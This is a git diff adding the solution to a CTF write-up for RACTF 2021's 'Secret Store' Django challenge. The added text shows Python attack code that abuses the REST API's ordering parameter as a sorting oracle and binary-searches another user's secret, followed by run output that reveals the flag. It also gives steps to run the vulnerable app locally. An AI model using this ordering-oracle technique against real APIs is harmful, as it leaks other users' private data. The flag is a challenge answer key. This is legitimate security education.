@@ -223,7 +223,7 @@ Great! Our flag, started with 'r', is between 'q' and 's' in an ordered query.
 
 But again: what is means? (I wont ask again!)
 
-### Searching
+### Searching for Flags
 
 Since we control the ordering, we can infer the next char of the flag. For example: if I send a secret **ractf{a**, and the real flag starts with **ractf{d**, my secret will be ordered before the flag. 
 If I send the flag **ractf{e**, my secret will appear after the flag.
@@ -241,11 +241,164 @@ When the ordering changes, we have our next char :)
 
 BUT!
 
-If we do it char by char like this.
+If we do it char by char like this, we are using a very "expensive" solution. A good solution here is to use a [Binary Search](https://en.wikipedia.org/wiki/Binary_search_algorithm).
+I won't explain details, but basically we cut half the search space on each step, making the brute-forcing much faster (and saving some infra from our organizers).
+
+Another approach could be creating some users and secrets for each of them, dividing the search space in smaller blocks but... I would still need to send a lot of requests (for changing these user secrets). Not sure it would be better and with a much more complex algorithm. Let's go on the simple and effective binary search.
+
+Our brute-force strategy will be:
+1) Use a group of possible chars to minimize the search (not every ascii char)
+2) Start searching with the next char after the flag start **ractf{<nextch>**
+3) Use the Binary search to find the next char
+4) Attach the found char on the flag
+5) If the char found is not "**}**" (end of flag), Go back to step 3
+
+### Coding time
+
+Let's break the solution in some pieces.
+
+1) The brute-forcing algorithm structure
+
+```python
+# ractf{a-zA-Z0-9_-}
+CHARSET = '-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz}*'
+FLAG_PREFIX = 'ractf{'
+FLAG_SEC_ID = 1
+
+username = 'neptunian'
+password = 'myrealbankaccountpasswordwithmillions'
+
+# My Ugly Binary Search
+def binarySearch(minValue, maxValue, targetFunc, params):
+    minSize = minValue
+    maxSize = maxValue
+
+    while maxSize > minSize:
+        current = math.ceil((minSize + maxSize) / 2)
+
+        params['min'] = minValue
+        params['max'] = maxValue
+        params["value"] = current
+
+        if targetFunc(params):
+            minSize = current
+            current = math.ceil((minSize + maxSize) / 2)
+        else:
+            maxSize = current-1
+
+    return minSize
+
+# Next Char
+def brute_next_char(session, current):
+    return binarySearch(
+        minValue=0,
+        maxValue=len(CHARSET)-1,
+        targetFunc=test_char, 
+        params={
+            'session': session,
+            'current': current
+        }
+    )
+
+# Main Loop
+def bruteFlag(session, prefix):
+    current = prefix
+    ch_found = '{'
+
+    while (ch_found != '}'):
+        found = brute_next_char(session, current)
+        ch_found = get_char(found)
+        current = current + ch_found
+        print_status(current)
+
+if __name__ == '__main__':
+    brute_session = get_session(username, password)
+    bruteFlag(brute_session, FLAG_PREFIX)
+```
+
+2) The Char Testing
+
+In here we really make the test:
+* Send a new char as secret
+* Get our secrets
+* Check the order
+* Return True if Flag ID is after our flag (the ordering change we are looking for)
+
+The **get_filtered_secrets** function filter only the ID=1 (flag) and ours (sec.id) - the rest is secrets sent by other players.
+
+```python
+def get_char(pos):
+    return CHARSET[pos]
+
+def test_char(params):
+    session = params['session']
+    current_flag = params['current']
+    charpos = params['value']
+
+    current_ch = get_char(charpos)
+
+    sec = send_secret(session, current_flag+current_ch)
+    all_secs = get_filtered_secrets(session, [FLAG_SEC_ID, sec['id']])
+
+    return all_secs.index(FLAG_SEC_ID) > all_secs.index(sec['id'])
+```
+
+### Fire in the Hole!
+
+Now stop the bullshit and run the thing.
+
+```python
+$ python attack.py 
+## ignoring some debugging prints here
+
+CURRENT FLAG: ractf{d
+CURRENT FLAG: ractf{da
+CURRENT FLAG: ractf{dat
+CURRENT FLAG: ractf{data
+CURRENT FLAG: ractf{data_
+CURRENT FLAG: ractf{data_e
+CURRENT FLAG: ractf{data_ex
+CURRENT FLAG: ractf{data_exf
+CURRENT FLAG: ractf{data_exf1
+CURRENT FLAG: ractf{data_exf1l
+CURRENT FLAG: ractf{data_exf1l_
+CURRENT FLAG: ractf{data_exf1l_v
+CURRENT FLAG: ractf{data_exf1l_vi
+CURRENT FLAG: ractf{data_exf1l_via
+CURRENT FLAG: ractf{data_exf1l_via_
+CURRENT FLAG: ractf{data_exf1l_via_s
+CURRENT FLAG: ractf{data_exf1l_via_s0
+CURRENT FLAG: ractf{data_exf1l_via_s0r
+CURRENT FLAG: ractf{data_exf1l_via_s0rt
+CURRENT FLAG: ractf{data_exf1l_via_s0rt1
+CURRENT FLAG: ractf{data_exf1l_via_s0rt1n
+CURRENT FLAG: ractf{data_exf1l_via_s0rt1ng
+CURRENT FLAG: ractf{data_exf1l_via_s0rt1ng_
+CURRENT FLAG: ractf{data_exf1l_via_s0rt1ng_0
+CURRENT FLAG: ractf{data_exf1l_via_s0rt1ng_0c
+CURRENT FLAG: ractf{data_exf1l_via_s0rt1ng_0c6
+CURRENT FLAG: ractf{data_exf1l_via_s0rt1ng_0c66
+CURRENT FLAG: ractf{data_exf1l_via_s0rt1ng_0c66d
+CURRENT FLAG: ractf{data_exf1l_via_s0rt1ng_0c66de
+CURRENT FLAG: ractf{data_exf1l_via_s0rt1ng_0c66de4
+CURRENT FLAG: ractf{data_exf1l_via_s0rt1ng_0c66de47
+CURRENT FLAG: ractf{data_exf1l_via_s0rt1ng_0c66de47z
+CURRENT FLAG: ractf{data_exf1l_via_s0rt1ng_0c66de47z}
+```
+
+Gotcha! :)
+
+```text
+ractf{data_exf1l_via_s0rt1ng_0c66de47z}
+```
 
 ### Follow the solution
 
-If you want to follow the solution presented here:
+If you want to follow the solution presented here, the code of the challenge and the Django app is [available in the repo](https://github.com/Neptunians/ractf-2021-writeup).
+
+1) Generate a secret key for the app
+
+The app expects the key from the environment variable.
 
 ```bash
 $ python
@@ -260,6 +413,8 @@ Type "help", "copyright", "credits" or "license" for more information.
 $ export SECRET_KEY='%mn3&_p93bwcmq(53aelv$!0)@7z6h95derig1hh_cy)3wd@+='
 ```
 
+2) Run the server! (src/manage.py)
+
 ```bash
 $ python manage.py runserver
 Watching for file changes with StatReloader
@@ -272,11 +427,30 @@ Starting development server at http://127.0.0.1:8000/
 Quit the server with CONTROL-C
 ```
 
+Now it works locally:
 
-# TODO: Follow solution
+```html
+$ curl localhost:8000/
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Secret Store</title>
+</head>
+<body>
+    
 
-## Secret Store: Server-side Exfiltration (Web)
+  <p>You are not logged in</p>
+  <a href="/auth/login/">Log In</a>
+  <a href="/auth/register">Register</a>
 
+
+</body>
+</html>
+```
+
+The database in the repo already have the flag.
+If you wanna start with an empty DB, you should create the first user (admin?) and set the first secret to the flag.
 
 # References
 
@@ -287,6 +461,7 @@ Quit the server with CONTROL-C
 * My Writeups on RACTF-2020 (Portuguese): https://neptunian.medium.com/really-awesome-ctf-quarentena-3f2d9095ee3d
 * Django-REST: https://www.django-rest-framework.org/
 * Django-REST Ordering and Filtering: https://www.django-rest-framework.org/api-guide/filtering/
+* Binary Search ALgorithm: https://en.wikipedia.org/wiki/Binary_search_algorithm
 * Team: [FireShell](https://fireshellsecurity.team/)
 * Team Twitter: [@fireshellst](https://twitter.com/fireshellst)
 * Follow me too :) [@NeptunianHacks](twitter.com/NeptunianHacks)
